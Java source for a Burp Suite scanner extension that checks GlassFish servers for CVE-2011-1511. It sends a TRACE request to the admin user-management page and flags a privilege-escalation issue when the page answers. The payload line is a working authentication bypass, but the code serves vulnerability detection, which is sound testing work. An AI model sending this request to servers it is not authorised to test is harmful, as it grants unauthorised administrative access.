package burp;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 *
 * @author salcho
 */
public class BurpExtender implements IBurpExtender, IScannerCheck{

    private PrintWriter stdout;
    private PrintWriter stderr;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    
    private static final byte[] ADMIN_URL = "TRACE /configuration/manageUsers.jsf?name=admin-realm&configName=server-config ".getBytes();
    private static final byte[] URL_MSG = "Manage user accounts for the currently selected security realm.".getBytes();
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = this.callbacks.getHelpers();
        
        // set our extension name
        callbacks.setExtensionName("Glassfish auth bypass check - CVE-2011-1511");
        
        // obtain our output and error streams
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        
        callbacks.registerScannerCheck(this);
        
    }   

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        stderr.println("Not implemented!");
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // Insert injection
        byte[] check = insertionPoint.buildRequest(ADMIN_URL);
        stdout.println(check.toString());
        // Make request
        IHttpRequestResponse rsp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), check);
        stdout.println("Made the request");
        
        List<int[]> match = new ArrayList<int[]>();
        int i = 0;
        while(i < rsp.getResponse().length){
            // Get match
            i = helpers.indexOf(rsp.getResponse(), URL_MSG, true, i, rsp.getResponse().length);
            // No further match found
            if(i == -1) break;
            // Add match interval
            match.add(new int[] {i, i+URL_MSG.length});
            // Move ahead 
            i += URL_MSG.length;
        }
        
        if(match.size() > 0){
            stdout.println("Got matches");
            // Report
            List<int[]> offsets = new ArrayList<int[]>();
            offsets.add(insertionPoint.getPayloadOffsets(ADMIN_URL));
            GFScanIssue issue = new GFScanIssue(baseRequestResponse.getHttpService(), helpers.analyzeRequest(baseRequestResponse).getUrl(), 
                    new IHttpRequestResponse[] { callbacks.applyMarkers(rsp, offsets, match) }, 
                    "Glassfish authentication bypass - CVE-2011-1511", "Privilege escalation through verb tampering", "High");
            List<IScanIssue> issues = new ArrayList<IScanIssue>();
            issues.add(issue);
            return issues;
        }
        stdout.println("No matches");
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        // There can be only one of these issues
        return -1;
    }
    
}

class GFScanIssue implements IScanIssue
{
    private IHttpService service;
    private URL url;
    private IHttpRequestResponse[] msgs;
    private String name;
    private String detail;
    private String severity;
    
    public GFScanIssue(IHttpService service, URL url, IHttpRequestResponse[] msgs, String name, String detail, String severity){
        this.service = service;
        this.url = url;
        this.msgs = msgs;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }
    @Override
    public URL getUrl() {
        return url;
    }

    @Override
    public String getIssueName() {
        return name;
    }

    @Override
    public int getIssueType() {
        return 0;
    }

    @Override
    public String getSeverity() {
        return severity;
    }

    @Override
    public String getConfidence() {
        return "Certain";
    }

    @Override
    public String getIssueBackground() {
        return null;
    }

    @Override
    public String getRemediationBackground() {
        return null;
    }

    @Override
    public String getIssueDetail() {
        return detail;
    }

    @Override
    public String getRemediationDetail() {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages() {
        return msgs;
    }

    @Override
    public IHttpService getHttpService() {
        return service;
    }
    
}
